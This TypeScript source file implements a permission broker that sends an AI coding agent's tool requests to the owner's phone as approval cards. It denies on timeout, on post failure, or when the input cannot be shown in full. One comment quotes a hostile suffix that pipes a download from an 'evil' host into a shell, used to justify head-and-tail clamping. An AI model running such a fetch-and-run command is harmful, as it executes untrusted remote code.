/**
 * Permission broker: turns an engine permission ask into a Relay card and
 * blocks until the phone answers (or the window expires → deny).
 *
 * Wire shape is shared with the Claude Code channel plugin
 * (integrations/claude-code/src/bridge.ts): one Relay message with a
 * human-readable text part (including the "yes <id>" / "no <id>" text
 * fallback) plus a `data` part
 *   { kind: "agent_permission_request", request_id, tool_name, description,
 *     input_preview, options: [{ id: "allow"|"deny", label,
 *     origin: { kind, request_id } }] }
 * and the same tolerant reply parser (origin-tagged data-part tap or text
 * fallback). Request ids use Claude Code's 5-char [a-km-z] alphabet.
 *
 * Pending approvals are durable resources, not in-memory callback state: each
 * ask is created (create-once) in the paired account runtime's approvals/
 * BEFORE the Relay card is posted; the loop writes the resolution when the
 * tap arrives, and the waiter (this broker's ACP path, or the codex hook in
 * another process) consumes it by unlinking the file. In-window entries stay
 * armed across restarts so a late tap is consumed instead of being forwarded
 * to the engine as a prompt; abandoned files age out after deadline + grace.
 */
import { randomInt } from "node:crypto";
import type { RelayClient } from "./api.js";
import type { ApprovalStore, PendingApproval, RelayMessage } from "./store.js";
import type { PermissionAsk, PermissionDecision } from "./engine/types.js";
import { engineDisplayName } from "./engine/catalog.js";

export const APPROVAL_TIMEOUT_MS = 10 * 60 * 1000;

export const PERMISSION_CARD_KIND = "agent_permission_request";

/** Claude Code request-id alphabet: five lowercase letters, never "l". */
const REQUEST_ID_ALPHABET = "abcdefghijkmnopqrstuvwxyz";
const REQUEST_ID_RE = /^[a-km-z]{5}$/;
export const PERMISSION_REPLY_RE = /^\s*(y|yes|n|no)\s+([a-km-z]{5})\s*$/i;

export function newRequestId(): string {
  let id = "";
  for (let i = 0; i < 5; i += 1) {
    id += REQUEST_ID_ALPHABET[randomInt(REQUEST_ID_ALPHABET.length)];
  }
  return id;
}

export interface PermissionVerdict {
  request_id: string;
  behavior: "allow" | "deny";
}

export function parseVerdictText(text: string): PermissionVerdict | null {
  const m = PERMISSION_REPLY_RE.exec(text);
  if (!m) return null;
  return {
    request_id: m[2]!.toLowerCase(),
    behavior: m[1]!.toLowerCase().startsWith("y") ? "allow" : "deny",
  };
}

function normalizeBehavior(value: unknown): "allow" | "deny" | null {
  if (typeof value !== "string") return null;
  const v = value.trim().toLowerCase();
  if (v === "allow" || v === "yes" || v === "y" || v === "approve") return "allow";
  if (v === "deny" || v === "no" || v === "n" || v === "reject") return "deny";
  return null;
}

/**
 * Parses an origin-tagged option tap carried in a `data` part. Accepted
 * shapes, checked in order (identical to the channel plugin):
 *
 *   { origin: { kind: "agent_permission_request", request_id }, option_id }
 *   { origin: { request_id }, option: "allow" | "deny" }
 *   { kind: "agent_permission_request", request_id, behavior | option_id }
 */
export function parseVerdictDataPart(data: unknown): PermissionVerdict | null {
  if (typeof data !== "object" || data === null) return null;
  const record = data as Record<string, unknown>;

  let requestId: unknown;
  const origin = record.origin;
  if (typeof origin === "object" && origin !== null) {
    requestId = (origin as Record<string, unknown>).request_id;
  }
  if (typeof requestId !== "string") requestId = record.request_id;
  if (typeof requestId !== "string") return null;
  const id = requestId.toLowerCase();
  if (!REQUEST_ID_RE.test(id)) return null;

  const behavior =
    normalizeBehavior(record.option_id) ??
    normalizeBehavior(record.option) ??
    normalizeBehavior(record.choice) ??
    normalizeBehavior(record.behavior);
  if (!behavior) return null;

  return { request_id: id, behavior };
}

/** Extracts a verdict from a user message: data-part tap first, then text. */
export function verdictFromMessage(message: RelayMessage): PermissionVerdict | null {
  for (const part of message.parts) {
    if (part.type !== "data") continue;
    const verdict = parseVerdictDataPart((part as { data?: unknown }).data);
    if (verdict) return verdict;
  }
  const text = message.parts
    .filter((part) => part.type === "text" && typeof part.text === "string" && part.text.length > 0)
    .map((part) => part.text as string)
    .join("\n");
  return parseVerdictText(text.length > 0 ? text : message.fallback_text ?? "");
}

const MAX_DESCRIPTION_CHARS = 500;
export const MAX_PERMISSION_PREVIEW_CHARS = 6_000;

export class PermissionPreviewTooLongError extends Error {
  constructor(readonly actualChars: number) {
    super(
      `permission input is ${actualChars} characters; Relay only permits approval when the full ` +
        `${MAX_PERMISSION_PREVIEW_CHARS}-character security preview can be shown`,
    );
    this.name = "PermissionPreviewTooLongError";
  }
}

/** Same defense-in-depth sanitization as the channel plugin. */
export function sanitizeRelayedText(value: string, maxChars: number): string {
  const cleaned = value
    .replace(/[\u200b-\u200f\u2028-\u202e\u2066-\u2069\ufeff]/g, "")
    .replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/g, "")
    .replace(/\s+/g, " ")
    .trim();
  return clampHeadTail(cleaned, maxChars);
}

/**
 * Over-limit values keep head + tail with an explicit omission marker: a
 * plain head truncation lets a hostile suffix (`… && curl evil | sh`) hide
 * behind the ellipsis on the approval card.
 */
export function clampHeadTail(value: string, maxChars: number): string {
  if (value.length <= maxChars) return value;
  const tailChars = Math.min(300, Math.floor(maxChars / 4));
  const marker = ` […${value.length - maxChars} of ${value.length} chars omitted…] `;
  const headChars = Math.max(1, maxChars - tailChars - marker.length);
  return `${value.slice(0, headChars)}${marker}${value.slice(value.length - tailChars)}`;
}

/**
 * Security-sensitive tool input is never truncated. If it cannot fit in the
 * approval card, the caller must deny instead of asking the owner to approve
 * an operation with concealed content.
 */
export function sanitizePermissionPreview(value: string): string {
  const cleaned = value
    .replace(/\r\n?/g, "\n")
    .replace(/[\u200b-\u200f\u2028-\u202e\u2066-\u2069\ufeff]/g, "")
    .replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/g, "")
    .trim();
  if (cleaned.length > MAX_PERMISSION_PREVIEW_CHARS) {
    throw new PermissionPreviewTooLongError(cleaned.length);
  }
  return cleaned;
}

export interface PermissionCardInput {
  requestId: string;
  conversationId: string;
  /** Human name for the asking engine. */
  engineLabel: string;
  toolName?: string;
  description?: string;
  inputPreview?: string;
}

export function buildPermissionCard(input: PermissionCardInput): {
  body: {
    conversation_id: string;
    parts: Array<Record<string, unknown>>;
  };
  idempotencyKey: string;
} {
  const toolName = sanitizeRelayedText(input.toolName ?? "", 100) || "a tool";
  const description = sanitizeRelayedText(input.description ?? "", MAX_DESCRIPTION_CHARS);
  const inputPreview = sanitizePermissionPreview(input.inputPreview ?? "");
  const id = input.requestId;

  const lines = [
    `${input.engineLabel} wants to run ${toolName}${description ? `: ${description}` : ""}`,
  ];
  if (inputPreview.length > 0) lines.push("", inputPreview);
  lines.push("", `Reply "yes ${id}" to allow or "no ${id}" to deny.`);

  return {
    body: {
      conversation_id: input.conversationId,
      parts: [
        { type: "text", text: lines.join("\n") },
        {
          type: "data",
          data: {
            kind: PERMISSION_CARD_KIND,
            request_id: id,
            tool_name: toolName,
            description,
            input_preview: inputPreview,
            options: [
              { id: "allow", label: "Allow", origin: { kind: PERMISSION_CARD_KIND, request_id: id } },
              { id: "deny", label: "Deny", origin: { kind: PERMISSION_CARD_KIND, request_id: id } },
            ],
          },
        },
      ],
    },
    idempotencyKey: `agent-perm-${id}`,
  };
}

/** Maps a binary verdict back onto the engine's richer option set. */
export function decisionForVerdict(
  approval: PendingApproval,
  behavior: "allow" | "deny",
): PermissionDecision {
  const prefix = behavior === "allow" ? "allow" : "reject";
  const exact = approval.options.find((option) => option.kind === `${prefix}_once`);
  const fuzzy = approval.options.find((option) => option.kind?.startsWith(prefix));
  const chosen = exact ?? fuzzy;
  if (chosen) return { behavior: "selected", optionId: chosen.option_id };
  return behavior === "allow" && approval.options[0]
    ? { behavior: "selected", optionId: approval.options[0].option_id }
    : { behavior: "cancelled" };
}

export function denyDecision(approval: PendingApproval): PermissionDecision {
  return decisionForVerdict(approval, "deny");
}

interface Waiter {
  approval: PendingApproval;
  resolve(decision: PermissionDecision): void;
  timer: NodeJS.Timeout;
}

export class PermissionBroker {
  private readonly waiters = new Map<string, Waiter>();

  constructor(
    private readonly client: RelayClient,
    private readonly approvals: ApprovalStore,
    private readonly timeoutMs = APPROVAL_TIMEOUT_MS,
    private readonly log: (line: string) => void = () => {},
  ) {}

  /**
   * Age out abandoned approval files. Files with an unconsumed resolution are
   * owned by a waiter in another process (e.g. a codex hook) and survive
   * until their deadline + grace window; only clearly-dead entries go.
   */
  sweep(now = Date.now()): void {
    for (const requestId of this.approvals.sweep(now)) {
      this.log(`aged out abandoned approval ${requestId}`);
    }
  }

  /**
   * Called by the receive loop for every inbound owner message. Returns true
   * when the message answered a pending approval and must NOT be forwarded to
   * the engine as a prompt.
   */
  consumeReply(message: RelayMessage): boolean {
    const verdict = verdictFromMessage(message);
    if (!verdict) return false;
    const approval = this.approvals.get(verdict.request_id);
    if (!approval || approval.resolution) {
      // A verdict-shaped reply with no live ask is still consumed: it must
      // never become an engine prompt.
      return true;
    }
    // A verdict only counts from the conversation that was asked.
    if (approval.conversation_id !== message.conversation_id) {
      this.log(
        `verdict for ${verdict.request_id} from wrong conversation ` +
          `${message.conversation_id} (expected ${approval.conversation_id}); ignored`,
      );
      return true;
    }
    const waiter = this.waiters.get(verdict.request_id);
    if (waiter) {
      // Our own ask: resolve in-process and consume the file.
      clearTimeout(waiter.timer);
      this.waiters.delete(verdict.request_id);
      this.approvals.consume(verdict.request_id);
      waiter.resolve(decisionForVerdict(approval, verdict.behavior));
    } else {
      // Armed by another process (codex hook): write the resolution for its
      // waiter to consume. Single writer per file — the hook only unlinks.
      approval.resolution = { behavior: verdict.behavior, decided_at: new Date().toISOString() };
      this.approvals.put(approval);
    }
    this.log(`approval ${verdict.request_id} resolved: ${verdict.behavior}`);
    return true;
  }

  /**
   * Deny without posting a card, for asks that have nowhere safe to be asked.
   * Nothing is persisted: an approval the owner never saw must leave no
   * pending file behind for a later sweep to reason about.
   */
  denyUnaskable(askInput: PermissionAsk): PermissionDecision {
    return denyDecision({
      request_id: askInput.requestId,
      conversation_id: "",
      created_at: new Date().toISOString(),
      deadline_at: new Date().toISOString(),
      options: askInput.options.map((option) => ({
        option_id: option.optionId,
        label: option.label,
        kind: option.kind,
      })),
      source: "acp",
    });
  }

  /** Post the card and block until tap or timeout→deny. */
  async ask(
    conversationId: string,
    askInput: PermissionAsk,
    engine: string,
  ): Promise<PermissionDecision> {
    const requestId = newRequestId();
    const approval: PendingApproval = {
      request_id: requestId,
      conversation_id: conversationId,
      engine,
      tool_name: askInput.toolName,
      created_at: new Date().toISOString(),
      deadline_at: new Date(Date.now() + this.timeoutMs).toISOString(),
      options: askInput.options.map((option) => ({
        option_id: option.optionId,
        label: option.label,
        kind: option.kind,
      })),
      source: "acp",
    };
    if (askInput.inputComplete === false) {
      this.log(`approval ${requestId} denied before posting: raw operation unavailable`);
      return denyDecision(approval);
    }
    let card: ReturnType<typeof buildPermissionCard>;
    try {
      card = buildPermissionCard({
        requestId,
        conversationId,
        engineLabel: engineDisplayName(engine),
        toolName: askInput.toolName,
        description: askInput.title,
        inputPreview: askInput.inputPreview,
      });
    } catch (error) {
      // Never ask the owner to approve a partially represented operation.
      this.log(`approval ${requestId} denied before posting: ${error}`);
      return denyDecision(approval);
    }

    // Durable (create-once) before the card goes out.
    this.approvals.create(approval);

    // Arm the waiter BEFORE the card goes out: a fast tap can race the POST's
    // response, and a verdict that lands before the waiter exists would
    // otherwise be recorded as a file resolution that this promise then
    // overwrites — or worse, timeout-denied after the user already allowed.
    const decision = new Promise<PermissionDecision>((resolve) => {
      const timer = setTimeout(() => {
        this.waiters.delete(requestId);
        this.approvals.consume(requestId);
        this.log(`approval ${requestId} timed out → deny`);
        resolve(denyDecision(approval));
      }, this.timeoutMs);
      // The engine is awaiting this decision; the timeout must keep the
      // process alive so every unanswered ask deterministically denies.
      this.waiters.set(requestId, { approval, resolve, timer });
    });

    try {
      const posted = await this.client.postMessage(card.body, card.idempotencyKey);
      // The waiter may already have resolved (fast tap): only annotate while
      // the approval file is still ours.
      if (this.waiters.has(requestId)) {
        approval.relay_message_id = posted.message_id;
        this.approvals.put(approval);
      }
    } catch (error) {
      // Card never reached the phone: withdraw the ask and deny.
      const waiter = this.waiters.get(requestId);
      if (waiter) {
        clearTimeout(waiter.timer);
        this.waiters.delete(requestId);
        this.approvals.consume(requestId);
        this.log(`approval ${requestId} card post failed → deny: ${error}`);
        waiter.resolve(denyDecision(approval));
      }
    }

    return await decision;
  }
}
